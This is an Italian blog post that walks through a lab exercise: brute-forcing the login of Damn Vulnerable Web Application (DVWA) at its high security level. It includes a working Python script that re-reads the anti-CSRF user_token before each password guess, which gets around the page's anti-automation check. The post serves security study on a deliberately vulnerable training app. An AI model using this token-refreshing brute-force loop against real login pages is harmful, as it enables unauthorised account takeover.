---
layout:     post
title:      "DVWA Brute Force [high security level]"
date:       2022-08-18 12:00:00 +0200
categories: [cyber-security, hacking, ita]
image:
---
Un po' per gioco, un po' per esercitarmi ho ripreso in mano un progetto molto utile a chi deve affrontare, a livello di studio e comprensione, il mondo delle vulnerabilità delle applicazioni web. [Damn Vulnerable Web Application](https://github.com/digininja/DVWA) (DVWA) è una piccola applicazione web scritta in Php che mette a disposizione varie componenti dotate delle più classiche delle vulnerabilità. Una delle caratteristiche molto utili che ho trovato è il fatto di avere a disposizione il codice della parte di applicazione vulnerabile ed un sistema a livelli, ovvero la piattaforma, per ogni vulnerabilità, propone più versioni:

- Low, che corrisponde ad un codice scritto veramente male e facile da sfruttare
- Medium, dove compaiono i primi controlli
- **High, dove i controlli sono robusti** (oggetto di questa serie di articoli)
- Impossible, che rappresenterebbe la versione non vulnerabile

Qualche giorno fa, in una delle recenti live, abbiamo affrontato il primo test relativo ad un attacco brute force. Nulla di particolare, la tecnica è anche abbastanza desueta ma in molti scenari continua ad essere un problema reale, soprattutto a causa dell'assenza di controlli specifici. Il codice Php del livello high (che come accennavo è il livello con cui ho deciso di affrontare sia le live che le spiegazioni in questi brevi articoli) presenta un controllo specifico per impedire a tools come Hydra di tentare attacchi di "forza bruta" in quanto la pagina di login, ad ogni richiesta, genera anche un token CSRF che viene controllato in fase di verifica delle credenziali.

<img src="{{ '/assets/images-posts/image-1.png' | relative_url }}" alt="image 1" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

In pratica l'applicazione si accerta che la richiesta di login provenga effettivamente dalla pagina che ha generato il login form e non da sistemi terzi (come un software per il brute force delle credenziali).

Per aggirare l'ostacolo dobbiamo quindi fare in modo che il sistema che esegue le richieste possa eseguire i tentativi di login sapendo il valore del token che la login page genera e solo dopo eseguire la chiamata alla funzione di login con il relativo token. Analizzando il codice HTML del login form è possibile verifica come tali dati vengono inviati all'applicazione:

<img src="{{ '/assets/images-posts/image-2.png' | relative_url }}" alt="image 2" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

E' ben visibile la GET per l'invio di username e password ed il campo nascosto - *input type="hidden"* - user_token con relativo valore.

Il nostro processo di *cracking* della credenziale deve quindi tenere in considerazione diversi elementi per eseguire dei test ricorsivi:

- E' necessaria una sessione valida per eseguire le prove con relativo phpsessid;
- Per ogni tentativo di invio delle credenziali è necessario generare un nuovo user_token da inviare alla pagina per verifica;

Se provassimo semplicemente ad eseguire il brute forcing con Burp Suite, ad esempio usando il Repeater, non otterremo mai un esito positivo in quanto non saremmo in grado di inviare anche lo user_token generato dalla pagina una volta caricata la login form.

Il flusso deve quindi prima ottenere la generazione della pagina, leggere lo user_token e poi eseguire il tentativo di login con una credenziale definita ad esempio da un dizionario. Il phpsessid potremmo provare a generarlo dinamicamente, in questa mia prima versione dello script lo prendiamo direttamente dall'applicazione con un primo tentativo di accesso tramite Burp Suite.

Intercettando il traffico del browser di un tentativo di login possiamo facilmente prelevare un ID di sessione valido, nel mio esempio:

<img src="{{ '/assets/images-posts/image-3.png' | relative_url }}" alt="image 3" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Il brute force verrà eseguito utilizzando quindi questa sessione valida.

Lo script è semplicissimo, per prima cosa ho definito un paio di variabili di comodo e qualche parametro da passare via command line:

```
# var, param, ...
target = argv[1]	# DVWA IP
phpsessid = argv[2]	# session cookie
url_index = "http://" + target + "/vulnerabilities/brute/index.php"
url_login = "http://" + target + "/vulnerabilities/brute/index.php"
# password list
passwords = ["123456", "qwerty", "password", "asdasd"]

'''
# get content page and token -- test
out = os.popen("wget " + target + " -q -O - | grep user_token | awk NR==1'{print $4; exit}'").read()
token = str(out).split("'")
token = token[1]
'''

# create permanent session
session = requests.session()
cookie = { 'PHPSESSID': phpsessid, 'security': 'high' }
```

Inizialmente mi ero "intestardito" con il voler raccogliere il primo token prima di generare la sessione e per questo utilizzavo una chiamata wget esterna (fu il primo tentativo durante una live su [Twitch](https://www.twitch.tv/roccosicilia)). Ho poi cambiato strada ma ho voluto mantenere questo passaggio commentato nello script.

Una volta preparati gli ingredienti principali lo script deve solo eseguire le operazioni di generazione token e richiesta login per ogni password in lista:

```
for p in passwords:
	# get token
	content = session.get(url_index, cookies=cookie)
	lines = content.text.splitlines()
	for line in lines:
		if 'user_token' in line:
			line = line.split("'")
			user_token = line[5]
	
	data = { 'username': 'admin', 'password': p, 'Login': 'Login', 'user_token': user_token }
	test = session.get(url_login, cookies=cookie, params=data)
	res = test.text
	# print(res) #### only for debug output
	
	print("Test-- \t password: {} \t token: {} \t cookie: {}".format(p, user_token, cookie))

	if 'Username and/or password incorrect.' in res:
		print("Fail-- \t Username and/or password incorrect.")
		print("-"*20)

	if 'Welcome to the password protected area admin' in res:
		print("Good Job! The correct password in \"{}\"".format(p))
		print("-"*20)
```

La versione completa dello script è disponibile nella [mia repository GitHub](https://github.com/roccosicilia/MyWriteup). Trovate una ulteriore versione della soluzione [in questo post](https://medium.com/@dannybeton/dvwa-brute-force-tutorial-high-security-456e6ed3ae39) su medium che ho trovato molto interessante.

In definitiva lo script non fa altro che eseguire un tentativo di accesso per ogni credenziale fornita generando, ad ogni iterazione, il nuovo user_token da utilizzare nella richiesta, aggirando così il controllo.

In esecuzione il risultato dovrebbe essere qualcosa di simile:

<img src="{{ '/assets/images-posts/image-4.png' | relative_url }}" alt="image 4" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Di seguito una breve clip dimostrativa del lab:

https://www.youtube.com/watch?v=XdQOHUOVHos

Approfitto dell'occasione di questo post per segnalare che inizierò probabilmente a caricare alcune clip dimostrative sul mio canale YouTube per mantenere un archivio dei nostri esperimenti.

## Prossimi step

Probabilmente aggiungerò allo script a possibilità di utilizzare un file come elenco password e vorrei portare dentro anche la definizione dell'ID di sessione da utilizzare.

DVWA ha diversi altri esercizi che meritano uno spazio, ho recentemente parlato in live delle SQL Injection su cui sicuramente tornerò assieme alla possibilità di eseguire Code Injection.
